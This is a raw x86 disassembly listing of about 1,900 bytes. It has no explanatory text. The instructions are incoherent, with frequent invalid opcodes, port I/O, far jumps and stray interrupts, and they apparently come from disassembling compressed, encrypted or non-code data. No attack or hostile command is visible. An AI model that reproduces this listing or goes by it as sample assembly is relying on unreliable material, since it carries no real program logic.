  417d04:	xchg   edi,ebp
  417d06:	rol    DWORD PTR [eax+edx*2-0x5b],0x47
  417d0b:	loop   0x417d15
  417d0d:	or     al,0xc
  417d0f:	out    0x97,eax
  417d11:	mov    ch,0x56
  417d13:	jo     0x417d01
  417d15:	push   cs
  417d16:	addr16 std 
  417d18:	aas    
  417d19:	lods   eax,DWORD PTR ds:[esi]
  417d1a:	jle    0x417cf9
  417d1c:	(bad)  [ebp+0x3b106cf9]
  417d22:	aam    0x41
  417d24:	in     al,0xe8
  417d26:	push   edx
  417d27:	les    edx,FWORD PTR [eax-0x2c]
  417d2a:	inc    ebx
  417d2b:	in     al,0x84
  417d2d:	mov    BYTE PTR [eax],ch
  417d2f:	mov    ecx,0xf85fab3a
  417d34:	mov    cl,0xf1
  417d36:	cmp    dh,BYTE PTR [esi+0x11559fad]
  417d3c:	mov    ch,0x0
  417d3e:	call   0x6ede:0x6c9eaffd
  417d45:	scas   eax,DWORD PTR es:[edi]
  417d46:	fisttp QWORD PTR [ebp-0x3f25dbb2]
  417d4c:	push   ebp
  417d4d:	cmp    BYTE PTR [eax-0x5b],dh
  417d50:	push   0x9a4e7ac9
  417d55:	or     al,0x39
  417d57:	jecxz  0x417d12
  417d59:	jnp    0x417d6c
  417d5b:	cwde   
  417d5c:	ret    0x72a5
  417d5f:	sbb    ecx,DWORD PTR [esi]
  417d61:	xor    esp,esp
  417d63:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  417d65:	mov    edx,DWORD PTR [esi]
  417d67:	sub    BYTE PTR ds:0x4af3ecc0,ah
  417d6d:	(bad)  
  417d6f:	scas   eax,DWORD PTR es:[edi]
  417d70:	sub    eax,esi
  417d72:	les    ecx,FWORD PTR [eax-0x49a46dad]
  417d78:	xor    bh,BYTE PTR [edx+0x77]
  417d7b:	cmp    bl,dh
  417d7d:	mov    ebp,DWORD PTR [eax-0x21]
  417d80:	ins    DWORD PTR es:[edi],dx
  417d81:	test   DWORD PTR [edx+ebp*4],0x7ba40747
  417d88:	ret    0x5623
  417d8b:	dec    esi
  417d8c:	add    BYTE PTR [ecx],cl
  417d8e:	bound  edi,QWORD PTR [esi+edi*4]
  417d91:	jp     0x417d17
  417d93:	call   DWORD PTR [edx+ebx*4-0x42]
  417d97:	jmp    0x417dd0
  417d99:	test   al,dh
  417d9b:	rcr    BYTE PTR [ebp-0x18],0x37
  417d9f:	out    0xaf,al
  417da1:	push   cs
  417da2:	xchg   esi,eax
  417da3:	daa    
  417da4:	xor    BYTE PTR [ebx],ch
  417da6:	jnp    0x417dc3
  417da8:	cmp    DWORD PTR [esi+0x7511ca0a],ecx
  417dae:	jo     0x417ddc
  417db0:	ficomp DWORD PTR [ebx-0xb8d05a3]
  417db6:	in     al,dx
  417db7:	push   0xf1b1a6b9
  417dbc:	popa   
  417dbd:	ffree  st(5)
  417dbf:	repnz jmp 0x48f7:0xede37d5e
  417dc7:	int    0x44
  417dc9:	inc    ebp
  417dca:	mov    ebp,0x237edcb1
  417dcf:	pusha  
  417dd0:	dec    esp
  417dd1:	cmp    bl,BYTE PTR [esi]
  417dd3:	pusha  
  417dd4:	xor    ebx,DWORD PTR [eax-0x6d8d0f4]
  417dda:	loop   0x417dc0
  417ddc:	addr16 pop ebx
  417dde:	xor    al,0x88
  417de0:	and    al,0x30
  417de2:	sub    BYTE PTR [ecx],cl
  417de4:	sub    edi,DWORD PTR ds:0x1de2553
  417dea:	loopne 0x417e1d
  417dec:	push   cs
  417ded:	leave  
  417dee:	inc    esi
  417def:	lods   eax,DWORD PTR ds:[esi]
  417df0:	out    dx,eax
  417df1:	and    cl,BYTE PTR [edi+0x6a36e769]
  417df7:	sub    al,0xb6
  417df9:	cmp    ebp,edx
  417dfb:	sbb    BYTE PTR [esi+0x39],bh
  417dfe:	popf   
  417dff:	ja     0x417e25
  417e01:	in     al,dx
  417e02:	mov    ebx,0x47993893
  417e07:	test   dh,cl
  417e09:	enter  0x3e00,0x39
  417e0d:	stc    
  417e0e:	(bad)  
  417e0f:	jecxz  0x417df8
  417e11:	mov    ch,BYTE PTR [esp+ebp*8+0x24]
  417e15:	in     eax,0xa4
  417e17:	lods   eax,DWORD PTR ds:[esi]
  417e18:	daa    
  417e19:	mov    esi,0x1aac4c47
  417e1e:	mov    cl,0xae
  417e20:	mov    ebp,0xd77d5c91
  417e25:	push   ss
  417e26:	push   edx
  417e27:	cdq    
  417e28:	adc    cl,BYTE PTR [edx+0x610e1497]
  417e2e:	adc    eax,0xaca02847
  417e33:	leave  
  417e34:	dec    esi
  417e35:	inc    ecx
  417e36:	inc    ecx
  417e37:	mov    dh,dl
  417e39:	enter  0x525a,0x4
  417e3d:	fmul   QWORD PTR [esi-0x27071eaf]
  417e43:	push   eax
  417e44:	xchg   ebp,eax
  417e45:	jp     0x417e82
  417e47:	mov    ?,WORD PTR [ecx+ebp*8-0x79]
  417e4b:	sar    BYTE PTR [eax+eax*8-0x1e],1
  417e4f:	repz mov cl,0x78
  417e52:	ret    
  417e53:	ins    BYTE PTR es:[edi],dx
  417e54:	push   edx
  417e55:	inc    edx
  417e56:	xchg   ebp,eax
  417e57:	mov    esi,DWORD PTR [ebx+0x35b8b5dc]
  417e5d:	(bad)  
  417e5e:	repnz inc edx
  417e60:	pop    ebx
  417e61:	pusha  
  417e62:	xchg   edi,eax
  417e63:	test   ebx,eax
  417e65:	fs ja  0x417ebb
  417e68:	out    0x81,eax
  417e6a:	je     0x417dfb
  417e6c:	jle    0x417e67
  417e6e:	and    eax,0x92c22ab9
  417e73:	inc    ebp
  417e74:	out    dx,eax
  417e75:	out    dx,al
  417e76:	mov    ds:0x5d761dd7,al
  417e7b:	sbb    eax,0x7c8c6c3c
  417e80:	scas   eax,DWORD PTR es:[edi]
  417e81:	mov    eax,ds:0x935605e2
  417e86:	sti    
  417e87:	dec    edi
  417e88:	lods   eax,DWORD PTR ds:[esi]
  417e89:	ds adc bh,bh
  417e8c:	and    ch,BYTE PTR [edi]
  417e8e:	mov    dl,0x6c
  417e90:	int    0x3a
  417e92:	int    0xe3
  417e94:	imul   esp,DWORD PTR [ebx+ecx*4-0x37],0x18
  417e99:	jmp    0x417f15
  417e9b:	fisub  WORD PTR [ebx-0xac0349f]
  417ea1:	sub    al,0x79
  417ea3:	lahf   
  417ea4:	aam    0xd5
  417ea6:	das    
  417ea7:	xchg   ebp,eax
  417ea8:	push   es
  417ea9:	js     0x417ed5
  417eab:	out    0xff,al
  417ead:	call   0x60622d0a
  417eb2:	cmc    
  417eb3:	test   al,0x9e
  417eb5:	gs ret 
  417eb7:	inc    edi
  417eb8:	in     eax,dx
  417eb9:	dec    eax
  417eba:	(bad)  
  417ebc:	test   DWORD PTR [edi+ebx*2+0x3d],ebp
  417ec0:	nop
  417ec1:	sub    DWORD PTR [ecx+0x274ea14f],esi
  417ec7:	jmp    0x1291:0x3962a4c
  417ece:	jae    0x417ef9
  417ed0:	shl    DWORD PTR [esi-0x60],1
  417ed3:	fild   WORD PTR [ecx]
  417ed5:	lds    edx,FWORD PTR ds:0xb6ef1d5d
  417edb:	sub    DWORD PTR [edx+ecx*8+0x70],eax
  417edf:	dec    eax
  417ee0:	push   edi
  417ee1:	mov    edx,0xff80d5aa
  417ee6:	mov    edi,0xacab145f
  417eeb:	(bad)  
  417eec:	or     BYTE PTR [edx],al
  417eee:	and    dh,BYTE PTR [ecx+0x1b]
  417ef1:	fidivr DWORD PTR [ebx]
  417ef3:	std    
  417ef4:	loope  0x417f29
  417ef6:	add    ch,BYTE PTR [edi+0x64]
  417ef9:	ds and eax,0xbaf3e7ba
  417eff:	push   edi
  417f00:	stc    
  417f01:	clc    
  417f02:	inc    edi
  417f03:	add    eax,0x6128a6d8
  417f08:	mov    cl,0x88
  417f0a:	cmp    al,0x14
  417f0c:	pop    esi
  417f0d:	mov    ebx,DWORD PTR [edx-0x23f11588]
  417f13:	aaa    
  417f14:	or     al,0xa9
  417f16:	inc    esp
  417f17:	or     ecx,ecx
  417f19:	cwde   
  417f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f1b:	jg     0x417f92
  417f1d:	in     al,0x91
  417f1f:	pop    ecx
  417f20:	sub    eax,0x4c6cbd4d
  417f25:	and    eax,0xf6e99d66
  417f2a:	test   BYTE PTR [ecx],ah
  417f2c:	and    eax,DWORD PTR [edx-0x4b]
  417f2f:	out    0x37,eax
  417f31:	out    0x27,eax
  417f33:	aad    0x5f
  417f35:	adc    DWORD PTR ds:0x5a9d4782,edi
  417f3b:	mov    esp,0xd189a7e5
  417f40:	mov    dh,0x34
  417f42:	or     eax,ecx
  417f44:	nop
  417f45:	sub    al,0xb2
  417f47:	cmp    DWORD PTR [ebp-0x77],edx
  417f4a:	aam    0x15
  417f4c:	push   ebx
  417f4d:	xchg   edi,eax
  417f4e:	mov    bl,0x4b
  417f50:	outs   dx,DWORD PTR ds:[esi]
  417f51:	mov    ch,0x9d
  417f53:	xor    ecx,DWORD PTR [esi-0x20199118]
  417f59:	(bad)  
  417f5a:	hlt    
  417f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f5c:	fadd   st,st(7)
  417f5e:	mov    WORD PTR [edx+eiz*1+0x37735100],fs
  417f65:	imul   ebx,DWORD PTR [edi+0x8d29e51],0xffffffde
  417f6c:	test   eax,0xfc93b00
  417f71:	jb     0x417fd9
  417f73:	in     al,dx
  417f74:	jl     0x417f23
  417f76:	stos   DWORD PTR es:[edi],eax
  417f77:	sbb    BYTE PTR [edi+edi*4-0x43],cl
  417f7b:	fild   QWORD PTR [edi+eiz*2]
  417f7e:	popa   
  417f7f:	fcomp  QWORD PTR [edx-0x51]
  417f82:	sti    
  417f83:	inc    ebx
  417f84:	lods   eax,DWORD PTR ds:[esi]
  417f85:	dec    esi
  417f86:	aas    
  417f87:	xchg   ecx,eax
  417f88:	sub    DWORD PTR [esi],eax
  417f8a:	outs   dx,DWORD PTR ds:[esi]
  417f8b:	xor    ebx,eax
  417f8d:	pop    edi
  417f8e:	inc    ebx
  417f8f:	pop    esi
  417f90:	iret   
  417f91:	mov    ecx,0x291df337
  417f96:	fidivr WORD PTR [edx]
  417f98:	cmp    bh,BYTE PTR [ecx+0x7811e35e]
  417f9e:	ins    BYTE PTR es:[edi],dx
  417f9f:	push   ss
  417fa0:	inc    edx
  417fa1:	lds    ebp,FWORD PTR [ecx]
  417fa3:	ret    
  417fa4:	and    ah,BYTE PTR [bp+si]
  417fa7:	xchg   al,dh
  417fa9:	inc    eax
  417faa:	adc    bl,BYTE PTR [eax]
  417fac:	jno    0x417fc1
  417fae:	retf   0x7d9d
  417fb1:	dec    esi
  417fb2:	sbb    eax,0xf9dd10a1
  417fb7:	imul   ecx,esi,0x66dedcd7
  417fbd:	(bad)  
  417fbe:	jo     0x417f70
  417fc0:	mov    edx,0x78e416ea
  417fc5:	jmp    0x463d:0xc0c88acd
  417fcc:	dec    edx
  417fcd:	popf   
  417fce:	in     eax,0x64
  417fd0:	cmp    dh,cl
  417fd2:	mov    ah,0xad
  417fd4:	mov    edi,0x4024c30c
  417fd9:	sldt   esi
  417fdc:	pop    edx
  417fdd:	cwde   
  417fde:	cmp    BYTE PTR [esi+edi*4-0x5a],bh
  417fe2:	mov    ds:0xed2fa76f,eax
  417fe7:	je     0x418008
  417fe9:	lods   al,BYTE PTR ds:[esi]
  417fea:	jmp    0x417ff4
  417fec:	mov    edi,0xc4e4dafb
  417ff1:	icebp  
  417ff2:	push   edi
  417ff3:	into   
  417ff4:	jns    0x417f77
  417ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ff7:	shr    BYTE PTR [ebp+0x2517a840],cl
  417ffd:	jbe    0x418070
  417fff:	sar    DWORD PTR [esi],0xd4
  418002:	test   eax,0x6e819dbb
  418007:	jno    0x417fcc
  418009:	ret    
  41800a:	push   ebp
  41800b:	dec    esi
  41800c:	cmp    ebx,DWORD PTR [ecx-0x76]
  41800f:	sub    edi,ebp
  418011:	and    al,0x48
  418013:	jle    0x41801b
  418015:	into   
  418016:	add    BYTE PTR [ebp+0x912b759],bl
  41801c:	mov    dl,0x69
  41801e:	cli    
  41801f:	mov    BYTE PTR [eax-0x4a],ch
  418022:	and    edi,DWORD PTR ds:0x50781196
  418028:	xchg   ebp,eax
  418029:	inc    edx
  41802a:	outs   dx,BYTE PTR ds:[esi]
  41802b:	jne    0x418029
  41802d:	sbb    eax,0x51e4f569
  418032:	out    dx,eax
  418033:	addr16 xchg esp,eax
  418035:	mov    cl,0xcc
  418037:	or     dh,0xda
  41803a:	push   es
  41803b:	and    BYTE PTR [esi+0x7c],0x3d
  41803f:	push   esp
  418040:	ss js  0x41801d
  418043:	test   eax,0xb5d9210f
  418048:	mov    edi,gs
  41804a:	leave  
  41804b:	mov    ds:0x9b4c2617,eax
  418050:	mov    ch,0x99
  418052:	pop    edx
  418053:	sub    ebx,ecx
  418055:	nop
  418056:	pop    esi
  418057:	push   esi
  418058:	jle    0x4180b3
  41805a:	int3   
  41805b:	mov    cl,0xbc
  41805d:	shl    BYTE PTR [edx+ecx*2],1
  418060:	aaa    
  418061:	cmc    
  418062:	addr16 clc 
  418064:	push   es
  418065:	and    eax,DWORD PTR [ebx]
  418067:	and    BYTE PTR [edi-0x3f8e4a3c],ah
  41806d:	aaa    
  41806e:	push   eax
  41806f:	sbb    BYTE PTR [ebx+eax*4],0x38
  418073:	scas   al,BYTE PTR es:[edi]
  418074:	dec    edi
  418075:	not    BYTE PTR [ebp-0x25]
  418078:	inc    esi
  41807a:	arpl   WORD PTR [edi+edi*4+0x2d],dx
  41807e:	into   
  41807f:	je     0x4180e9
  418081:	stos   DWORD PTR es:[edi],eax
  418082:	(bad)  
  418083:	fsubr  QWORD PTR [ebp+0x62]
  418086:	jns    0x418041
  418088:	popa   
  418089:	in     al,0x97
  41808b:	sti    
  41808c:	leave  
  41808d:	mov    ebp,0x6d26f925
  418092:	inc    ecx
  418093:	pop    edx
  418094:	cmp    BYTE PTR [ebp+edx*1+0x7d],cl
  418098:	fsubr  st(3),st
  41809a:	inc    eax
  41809b:	add    ah,BYTE PTR [ecx]
  41809d:	push   esi
  41809e:	aad    0xcf
  4180a0:	lock add eax,esi
  4180a3:	pop    es
  4180a4:	jae    0x418104
  4180a6:	mov    ds:0x2a2b7f93,al
  4180ab:	mov    eax,0x358ceb05
  4180b0:	adc    al,0x35
  4180b2:	and    BYTE PTR [ecx-0x41],dh
  4180b5:	dec    edx
  4180b6:	push   0x36
  4180b8:	and    esi,DWORD PTR [ebx]
  4180ba:	loop   0x4180d1
  4180bc:	and    al,0xe6
  4180be:	stos   BYTE PTR es:[edi],al
  4180bf:	xchg   edi,eax
  4180c0:	aam    0x53
  4180c2:	cmp    DWORD PTR [edx-0x68b76c9b],ebx
  4180c8:	and    dl,BYTE PTR [edx+0x4d]
  4180cb:	out    0xaf,al
  4180cd:	sbb    edi,esi
  4180cf:	out    dx,eax
  4180d0:	inc    ebx
  4180d1:	imul   ch
  4180d3:	aas    
  4180d4:	pop    eax
  4180d5:	dec    ebp
  4180d6:	std    
  4180d7:	daa    
  4180d8:	pop    ecx
  4180d9:	xchg   ebx,eax
  4180da:	mov    dh,0x5a
  4180dc:	dec    edx
  4180dd:	icebp  
  4180de:	ins    BYTE PTR es:[edi],dx
  4180df:	sti    
  4180e0:	loopne 0x418072
  4180e2:	xchg   esi,eax
  4180e3:	iret   
  4180e4:	stos   DWORD PTR es:[edi],eax
  4180e5:	ret    
  4180e6:	leave  
  4180e7:	aaa    
  4180e8:	icebp  
  4180e9:	fld    TBYTE PTR [edx-0x18]
  4180ec:	shl    DWORD PTR [edx],1
  4180ee:	push   ebx
  4180ef:	push   ecx
  4180f0:	fisttp WORD PTR [edx]
  4180f2:	rcl    BYTE PTR [ecx],1
  4180f4:	and    DWORD PTR [ebx+ecx*1],esi
  4180f7:	imul   eax,DWORD PTR ss:[eax-0x43],0x38
  4180fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180fd:	lds    ecx,FWORD PTR [esi-0x21]
  418100:	ja     0x418117
  418102:	in     eax,dx
  418103:	and    bh,bh
  418105:	rol    BYTE PTR [edi+0x7d],1
  418108:	(bad)  
  418109:	(bad)  
  41810a:	pop    esp
  41810b:	icebp  
  41810c:	lea    ebp,[ecx]
  41810e:	push   ebp
  41810f:	push   ebx
  418110:	or     ah,BYTE PTR [esi+0x76]
  418113:	xor    eax,0x1f4155df
  418118:	add    ch,BYTE PTR [ebp+0x762ee2de]
  41811e:	push   DWORD PTR [edi+0x7a]
  418121:	jnp    0x4180a4
  418123:	cmc    
  418124:	or     ch,BYTE PTR [edi]
  418126:	dec    eax
  418127:	and    al,0x44
  418129:	lods   eax,DWORD PTR ds:[esi]
  41812a:	xchg   cl,ah
  41812c:	mov    ebx,0xfeab26cf
  418131:	xor    al,0xbf
  418133:	mov    ebx,ebx
  418135:	rol    DWORD PTR [esi+0x33621a37],0x98
  41813c:	add    eax,0x31fc1df3
  418141:	adc    al,0x1c
  418143:	test   eax,0xa8ef3ecd
  418148:	enter  0x815d,0x8
  41814c:	or     BYTE PTR [esi+0x36e36332],0x70
  418153:	pop    edi
  418154:	dec    edx
  418155:	stc    
  418156:	dec    esi
  418157:	adc    al,BYTE PTR [edi]
  418159:	enter  0x753b,0xd4
  41815d:	cmc    
  41815e:	xor    bl,al
  418160:	mov    dl,0x1c
  418162:	adc    ecx,eax
  418164:	add    al,0x3b
  418166:	lea    edi,[ecx+0x6f]
  418169:	fild   WORD PTR [edx+0x1d8d591b]
  41816f:	mul    ecx
  418171:	sbb    DWORD PTR [edi-0x72f7842a],ecx
  418177:	dec    esp
  418178:	aad    0xd6
  41817a:	xor    eax,0xcc3cf657
  41817f:	int    0x7c
  418181:	sub    bl,BYTE PTR [ebp+esi*1-0x6]
  418185:	arpl   si,cx
  418187:	shr    BYTE PTR [ebp-0x17],cl
  41818a:	(bad)  
  41818b:	adc    eax,0xdca667fc
  418190:	jp     0x41818e
  418192:	pop    eax
  418193:	pop    ebx
  418194:	mov    al,ds:0x9412354
  418199:	stc    
  41819a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41819b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41819c:	and    al,0x7d
  41819e:	mov    edx,0xb027755
  4181a3:	sbb    ebp,DWORD PTR [ecx-0x13]
  4181a6:	xor    eax,0x7249ca06
  4181ab:	inc    ebx
  4181ac:	sub    BYTE PTR [ebx-0x41],dl
  4181af:	pop    ss
  4181b0:	push   edi
  4181b1:	jns    0x41815a
  4181b3:	lock arpl WORD PTR [ebx],cx
  4181b6:	sub    esi,DWORD PTR [ebx+ebp*2-0x536794f7]
  4181bd:	nop
  4181be:	out    0x6e,eax
  4181c0:	and    ah,BYTE PTR [ebx+0x79254b47]
  4181c6:	sbb    DWORD PTR [edi],0x75
  4181c9:	and    eax,0xdd476518
  4181ce:	xor    esp,DWORD PTR [edx]
  4181d0:	or     al,0x5c
  4181d2:	fld    TBYTE PTR [ebp-0x58]
  4181d5:	in     al,dx
  4181d6:	psubusw mm6,QWORD PTR [eax]
  4181d9:	cmp    ecx,ebx
  4181db:	dec    cl
  4181dd:	jl     0x418187
  4181df:	imul   esi,DWORD PTR [ebp+0x46fff1cc],0xffffff86
  4181e6:	out    dx,al
  4181e7:	sbb    bl,ch
  4181e9:	xchg   edi,eax
  4181ea:	outs   dx,DWORD PTR ds:[esi]
  4181eb:	add    BYTE PTR [esi-0x1593ad1c],0x5
  4181f2:	cmc    
  4181f3:	sub    al,0x66
  4181f5:	pushf  
  4181f6:	sub    dl,BYTE PTR [edx+0x54]
  4181f9:	adc    DWORD PTR [edi-0x77],ebx
  4181fc:	xor    dh,BYTE PTR [esi]
  4181fe:	mov    ah,0x62
  418200:	or     al,0x3a
  418202:	leave  
  418203:	cmp    al,dh
  418205:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  418207:	sbb    eax,0xf3e499a1
  41820c:	cmp    DWORD PTR [edi+edx*4],edi
  41820f:	sub    al,0xbc
  418211:	jb     0x418223
  418213:	dec    edi
  418214:	mov    bl,0x49
  418216:	in     al,dx
  418217:	fdiv   DWORD PTR [eax-0x9d4f823]
  41821d:	loope  0x4181d4
  41821f:	fisub  WORD PTR [esi+ecx*1-0x20]
  418223:	jmp    0x4181d8
  418225:	push   edx
  418226:	(bad)  
  418227:	call   0x27f6fffa
  41822c:	xchg   si,ax
  41822e:	xor    eax,0x61a65f62
  418233:	dec    edx
  418234:	jns    0x4181fd
  418236:	ss mov dl,0x85
  418239:	xchg   DWORD PTR [edx+0x59],ebp
  41823c:	sbb    bh,BYTE PTR [edi]
  41823e:	popf   
  41823f:	xchg   esp,eax
  418240:	aam    0x7a
  418242:	cmc    
  418243:	jnp    0x418240
  418245:	arpl   WORD PTR [ecx-0x270bb496],cx
  41824b:	jb     0x418262
  41824d:	mov    esi,0x4f928d0
  418252:	lods   al,BYTE PTR ds:[esi]
  418253:	inc    eax
  418254:	pop    esi
  418255:	fimul  WORD PTR [edx+0x1b]
  418258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418259:	fdivr  DWORD PTR [ebx]
  41825b:	xchg   ebx,eax
  41825c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41825d:	xchg   edi,eax
  41825e:	sahf   
  41825f:	push   ecx
  418261:	addr16 xor eax,0x6b38fc5f
  418267:	push   ss
  418268:	mov    esi,0x3ab83a69
  41826d:	mov    dh,0xa3
  41826f:	je     0x41822e
  418271:	pop    esi
  418272:	not    DWORD PTR [esi+0x6036eabe]
  418278:	out    0x38,al
  41827a:	add    DWORD PTR [esi-0x33e55408],eax
  418280:	xlat   BYTE PTR ds:[ebx]
  418281:	out    dx,al
  418282:	icebp  
  418283:	enter  0x3254,0x50
  418287:	sbb    BYTE PTR [eax+0x39],0x5e
  41828b:	pminsw mm2,QWORD PTR [eax+0x7c]
  41828f:	lock xlat BYTE PTR ds:[ebx]
  418291:	fcmovbe st,st(1)
  418293:	cmp    ah,BYTE PTR ds:0xb337bced
  418299:	jae    0x4182df
  41829b:	sub    eax,0x451d6b4c
  4182a0:	dec    esp
  4182a1:	aaa    
  4182a2:	or     al,0xbf
  4182a4:	mov    bh,0x5f
  4182a6:	idiv   DWORD PTR [ebp+0xa]
  4182a9:	call   0x810381f9
  4182ae:	pop    ecx
  4182af:	ins    BYTE PTR es:[edi],dx
  4182b0:	ins    DWORD PTR es:[edi],dx
  4182b1:	fisub  WORD PTR fs:[ebp+0x28]
  4182b5:	sub    ch,dh
  4182b7:	lea    edi,[ebx]
  4182b9:	and    eax,0xe61edc54
  4182be:	ret    0x215e
  4182c1:	shl    DWORD PTR gs:[esi+0x73],0xc9
  4182c6:	ins    BYTE PTR es:[edi],dx
  4182c7:	pop    eax
  4182c8:	test   al,0xda
  4182ca:	lock fild DWORD PTR [edi+0x13]
  4182ce:	daa    
  4182cf:	retf   
  4182d0:	push   eax
  4182d1:	test   edi,edi
  4182d3:	or     BYTE PTR [edi+esi*1-0x6f],bl
  4182d7:	test   al,0xb0
  4182d9:	dec    ebx
  4182da:	sub    BYTE PTR ds:[edx+0x30bd974c],bh
  4182e1:	ss in  al,dx
  4182e3:	and    al,0x56
  4182e5:	les    edx,FWORD PTR [eax-0x17]
  4182e8:	adc    ch,BYTE PTR [edx+0x7a3ae7d3]
  4182ee:	stos   BYTE PTR es:[edi],al
  4182ef:	adc    al,0x35
  4182f1:	mov    DWORD PTR [ebx],esi
  4182f3:	fbld   TBYTE PTR [ecx]
  4182f5:	xor    BYTE PTR [ebx],0x66
  4182f8:	and    al,0x5a
  4182fa:	mov    bh,0x21
  4182fc:	add    al,0x13
  4182ff:	cmp    al,0x31
  418301:	lods   eax,DWORD PTR ds:[esi]
  418302:	lahf   
  418303:	xchg   BYTE PTR [edx-0x1350363a],ah
  418309:	shr    dl,1
  41830b:	and    BYTE PTR [edx+esi*8+0x4c26b16c],bh
  418312:	int3   
  418313:	rol    DWORD PTR [ecx+0x2],cl
  418316:	jo     0x41838f
  418318:	mov    esi,0xe326abff
  41831d:	shl    DWORD PTR [ecx],0x48
  418320:	retf   
  418321:	inc    edx
  418322:	fmul   st(1),st
  418324:	dec    esi
  418325:	adc    esp,eax
  418327:	xor    bl,bh
  418329:	enter  0xb8c5,0xe5
  41832d:	xor    BYTE PTR [edx+0x32ad68a8],dh
  418333:	mov    ebx,0x78e27dbf
  418338:	loopne 0x4182f8
  41833a:	or     BYTE PTR [ebp+0x3b],bl
  41833d:	jge    0x41834a
  41833f:	mov    BYTE PTR [ebp+0x26],0x8d
  418343:	mov    bl,0x82
  418345:	cmp    bh,bh
  418347:	std    
  418348:	outs   dx,DWORD PTR ds:[esi]
  418349:	xchg   esp,eax
  41834a:	pop    esi
  41834b:	int    0xbe
  41834d:	aas    
  41834e:	or     bh,ch
  418350:	mov    DWORD PTR [ebp-0x10],ecx
  418353:	xchg   esp,eax
  418354:	lods   al,BYTE PTR ds:[esi]
  418355:	enter  0xa2dd,0x13
  418359:	or     dh,BYTE PTR [edi-0x5e7ab039]
  41835f:	cmp    BYTE PTR [ebp+0x64a108a0],dh
  418365:	sub    cl,BYTE PTR [ebx-0x1c5a3e15]
  41836b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41836c:	loop   0x41837e
  41836e:	sar    BYTE PTR [eax],0x80
  418371:	mov    edx,0xcf077add
  418376:	cwde   
  418377:	push   ds
  418378:	idiv   ecx
  41837a:	adc    eax,0xd2d1ccba
  41837f:	mov    esp,0x5949be70
  418384:	sub    BYTE PTR [esi+edx*4-0x40],cl
  418388:	push   ss
  418389:	(bad)  
  41838b:	out    0xaf,al
  41838d:	or     esi,DWORD PTR [edi-0x2a]
  418390:	jmp    0x4183c5
  418392:	es jo  0x4183a9
  418395:	(bad)  
  418397:	xor    eax,0x667c2b2e
  41839c:	xor    DWORD PTR [eax-0x57563141],edx
  4183a2:	jmp    0x8a89:0x9be118ce
  4183a9:	xchg   dx,ax
  4183ab:	inc    eax
  4183ac:	sbb    edi,DWORD PTR [esi]
  4183ae:	(bad)  
  4183af:	retf   
  4183b0:	(bad)  
  4183b1:	out    dx,al
  4183b2:	jo     0x418370
  4183b4:	and    bh,BYTE PTR [edx]
  4183b6:	dec    edi
  4183b7:	mov    ch,0x96
  4183b9:	mov    ebp,0xde3a5453
  4183be:	cmc    
  4183bf:	push   es
  4183c0:	mov    edx,0xbffe1cd7
  4183c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183c6:	dec    esi
  4183c7:	pop    edi
  4183c8:	xchg   DWORD PTR [esi-0x7b022de],esp
  4183ce:	jb     0x4183f9
  4183d0:	rcr    DWORD PTR [edx-0x314c54be],1
  4183d6:	mov    al,ds:0x28b92bd5
  4183db:	mov    BYTE PTR [ebp-0x24b97fb1],ch
  4183e1:	mov    edi,0x13b87871
  4183e6:	mov    bh,0x5b
  4183e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183e9:	jae    0x41841a
  4183eb:	sbb    bh,BYTE PTR ds:0x6ee713d9
  4183f1:	mov    ebx,0x2fd5c448
  4183f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183f7:	js     0x4183b2
  4183f9:	lds    eax,FWORD PTR [esi]
  4183fb:	jle    0x418446
  4183fd:	push   ss
  4183fe:	mov    ah,BYTE PTR [edi]
  418400:	aam    0x11
  418402:	hlt    
  418403:	mov    esp,0x2b18f0fb
  418408:	mov    DWORD PTR [ebx],esi
  41840a:	mov    cl,BYTE PTR [edi+ecx*1+0x20]
  41840e:	and    bl,dh
  418410:	jbe    0x41847b
  418412:	jle    0x41848a
  418414:	dec    DWORD PTR [eax-0x56ada63d]
  41841a:	or     cl,dh
  41841c:	adc    al,0xfc
  41841e:	jns    0x418454
  418420:	adc    ecx,DWORD PTR [edi+0x7]
  418423:	out    dx,eax
  418424:	jp     0x4183f8
  418426:	adc    DWORD PTR [ebp-0x17c1b756],edx
  41842c:	pushf  
  41842d:	mov    al,0x67
  41842f:	mov    ebp,0x76573509
  418434:	adc    BYTE PTR [ebp-0x5b],cl
  418437:	mov    eax,ds:0xc0b4ce2b
  41843c:	or     ah,BYTE PTR [edx]
  41843e:	aas    
  41843f:	fadd   st,st(0)
  418441:	push   ds
  418442:	aam    0x5
  418444:	jg     0x41845a
  418446:	adc    bl,BYTE PTR [edi-0x6e]
  418449:	cli    
  41844a:	push   ebx
  41844b:	adc    eax,0x7cb55bce
  418450:	inc    ebx
  418451:	ror    BYTE PTR [ebp+0x2c],0x17
  418455:	std    
  418456:	inc    eax
  418457:	stos   BYTE PTR es:[edi],al
  418458:	xlat   BYTE PTR ds:[ebx]
  418459:	pop    ecx
  41845a:	jne    0x418446
  41845c:	sub    eax,0x687e3990
  418461:	mov    edx,0x74ab4a40
  418466:	push   ss
  418467:	pop    ecx
  418468:	in     eax,dx
  418469:	js     0x418404
  41846b:	addr16 std 
  41846d:	cld    
  41846e:	mov    ebp,0xa0eae741
  418473:	xchg   ebp,eax
  418474:	xor    DWORD PTR [ebx-0x196daba7],ebx
  41847a:	mov    DWORD PTR [edx],edx
  41847c:	and    eax,esi
  41847e:	mov    eax,0x38233b5f
  418483:	cmp    eax,0x5f22e4f9
  418488:	ret    0x5c36
  41848b:	imul   edi,ecx,0x68
  41848e:	mov    ebp,DWORD PTR [eax+eax*2+0x245b4429]
  418495:	cmp    eax,0x33507291
  41849a:	das    
  41849b:	hlt    
  41849c:	adc    al,0x87
  41849e:	retf   
  41849f:	or     al,0x3f
  4184a1:	loopne 0x418462
